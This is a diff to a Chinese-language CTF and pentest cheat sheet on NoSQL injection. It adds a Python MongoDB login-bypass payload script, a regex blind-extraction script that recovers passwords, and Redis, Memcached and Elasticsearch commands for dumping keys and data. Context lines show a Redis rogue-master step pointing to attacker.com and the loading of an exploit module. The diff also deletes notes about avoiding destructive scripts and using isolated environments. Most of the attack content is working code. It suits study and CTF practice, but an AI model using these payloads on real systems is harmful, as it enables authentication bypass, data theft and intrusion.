@@ -43,7 +43,7 @@ tags:
   - "couchdb"
   - "injection"
 language: "zh-CN"
-last_updated: "2026-06-25"
+last_updated: "2026-07-04"
 related_articles: []
 ---
 # NoSQL Injection — NoSQL 注入攻击
@@ -113,6 +113,74 @@ $where → JavaScript 表达式
 {"username": {"$regex": "^a"}}
 ```
 
+### 1.5 参数解析差异
+
+MongoDB 注入很多时候不是 Mongo 本身的问题，而是 Web 框架把参数解析成了对象。
+
+| 输入格式 | 后端可能得到的对象 | 适用栈 |
+|---|---|---|
+| `user[$ne]=x` | `{"user":{"$ne":"x"}}` | PHP、Express qs、Rails nested params |
+| `user.name=admin` | `{"user":{"name":"admin"}}` | lodash/set、Mongoose update |
+| JSON body | `{"user":{"$ne":null}}` | Node/Python API |
+| duplicate key | `{"user":"a","user":{"$ne":null}}` | parser 取首/尾不一致 |
+| array | `{"user":["admin",{"$ne":null}]}` | 类型检查缺失 |
+| dotted key | `{"profile.role":"admin"}` | Mongo dot notation |
+
+批量打点：
+
+```python
+import requests
+
+PAYLOADS = [
+    {"username": {"$ne": None}, "password": {"$ne": None}},
+    {"username": {"$regex": "^admin"}, "password": {"$ne": None}},
+    {"username[$ne]": "x", "password[$ne]": "x"},
+    {"username": ["admin", {"$ne": None}], "password": {"$ne": None}},
+]
+
+def probe_mongo_login(url):
+    for p in PAYLOADS:
+        r = requests.post(url, json=p, timeout=8)
+        print("[json]", p, r.status_code, r.text[:120])
+        r = requests.post(url, data=p, timeout=8)
+        print("[form]", p, r.status_code, r.text[:120])
+```
+
+成功标志：登录态 Cookie、用户资料页、错误从“密码错误”变成“多结果/类型错误”、响应时间因 `$where` 或 `$regex` 改变。失败样本：返回 `unknown operator: $ne` 说明 payload 已经进 Mongo 但被放在了不允许 operator 的位置。
+
+### 1.6 Regex 盲注抽取
+
+`$regex` 可以把字段当作前缀树抽取，适合登录框、搜索框、GraphQL filter。
+
+```python
+import string
+import requests
+
+ALPHABET = string.ascii_letters + string.digits + "_-{}@."
+
+def hit(url, prefix):
+    body = {
+        "username": {"$regex": "^admin$"},
+        "password": {"$regex": "^" + prefix},
+    }
+    r = requests.post(url, json=body)
+    return "dashboard" in r.text or r.status_code in (200, 302)
+
+def extract_regex(url, max_len=64):
+    prefix = ""
+    for _ in range(max_len):
+        for ch in ALPHABET:
+            if hit(url, prefix + ch):
+                prefix += ch
+                print(prefix)
+                break
+        else:
+            break
+    return prefix
+```
+
+如果 `^prefix` 被拦，试 `.{0,n}`、字符类、大小写开关或 URL/form 编码切换；如果 regex 很慢，说明可转 ReDoS/时间通道。
+
 ## 2. Redis 未授权访问
 
 ### 2.1 探测
@@ -162,6 +230,29 @@ redis-cli -h target SLAVEOF attacker.com 6379
 redis-cli -h target MODULE LOAD /tmp/exp.so
 ```
 
+### 2.6 Redis 状态判断
+
+| 响应 | 含义 | 下一步 |
+|---|---|---|
+| `+PONG` | 无认证或已认证 | `INFO`、`DBSIZE`、`SCAN` |
+| `-NOAUTH Authentication required.` | 需要密码 | 找配置泄露、弱口令、SSRF Gopher |
+| `-DENIED Redis is running in protected mode` | 绑定公网但 protected-mode | 只能本机/SSRF 打 |
+| `-ERR unknown command 'CONFIG'` | 命令被 rename/ACL 禁用 | 试 `ACL LIST`、`COMMAND`、业务 key |
+| `-READONLY You can't write against a read only replica` | 从库 | 找 master、读 key、复制拓扑 |
+
+key 空间枚举：
+
+```bash
+redis-cli -h target --scan --pattern '*flag*'
+redis-cli -h target --scan --pattern '*session*'
+redis-cli -h target TYPE keyname
+redis-cli -h target GET keyname
+redis-cli -h target HGETALL hashkey
+redis-cli -h target LRANGE listkey 0 20
+```
+
+CTF 里不要只盯 RCE：很多题的 flag 在 `session:*`、`cache:user:*`、`laravel:*`、`think:*`、`flask_session:*`、`jwt:*` 这类业务 key 里。
+
 ## 3. Elasticsearch 注入
 
 ### 3.1 Groovy 脚本注入 (ES < 2.x)
@@ -201,6 +292,27 @@ GET /_nodes                   # 节点信息
 GET /_cluster/health          # 集群健康
 ```
 
+### 3.4 Elasticsearch 查询注入细节
+
+| 入口 | Payload | 目标 |
+|---|---|---|
+| URL q | `/_search?q=*:*` | 拖全部文档 |
+| query_string | `"admin OR password:*"` | 扩展搜索条件 |
+| wildcard | `"*flag*"` | 字段/值模糊搜索 |
+| sort | `sort=field:desc` | 报错泄露字段类型 |
+| source filter | `_source=flag,password,token` | 只取关键字段 |
+| scroll/search_after | `scroll=1m` | 分页导出 |
+
+字段发现：
+
+```bash
+curl -s 'http://target:9200/_mapping?pretty'
+curl -s 'http://target:9200/_field_caps?fields=*'
+curl -s 'http://target:9200/_search?q=flag OR password OR token&size=20'
+```
+
+命中样本：`hits.total.value` 增加、`_source` 出现业务字段、报错里出现 `No mapping found for [field]` 或字段类型。
+
 ## 4. CouchDB 攻击
 
 ### 4.1 未授权访问
@@ -239,6 +351,29 @@ echo "stats cachedump 1 100" | nc target 11211  # 缓存内容
 echo "get keyname" | nc target 11211
 ```
 
+### 5.3 Memcached key 恢复
+
+`stats cachedump` 在新版本/大实例上经常不可用，先看 slab，再逐 slab 打。
+
+```bash
+echo "stats slabs" | nc target 11211
+echo "stats items" | nc target 11211
+echo "stats cachedump 1 200" | nc target 11211
+```
+
+常见 CTF key 关键词：
+
+```text
+flag
+session
+user
+admin
+token
+csrf
+captcha
+cache
+```
+
 ## 攻击链 / 工作流
 
 ```
@@ -246,8 +381,8 @@ echo "get keyname" | nc target 11211
 2. 入口打点：未授权访问、认证绕过、错误信息、状态接口
 3. MongoDB：测试 $ne/$regex/$where 等操作符注入，确认 JSON/参数解析方式
 4. Redis/Memcached：INFO/STATS/GET 打点，确认 key 空间、权限边和下一跳
-5. Elasticsearch/CouchDB：枚举索引/数据库/用户，不直接执行破坏性脚本
-6. 需要 RCE 链时记录版本、插件/脚本引擎状态和写入路径，隔离环境复现
+5. Elasticsearch/CouchDB：枚举索引/数据库/用户，定位可读字段和可写 API
+6. 需要 RCE 链时记录版本、插件/脚本引擎状态和写入路径
 7. 收敛证据：服务类型、版本、认证状态、可读键/集合/索引样例
 ```
 
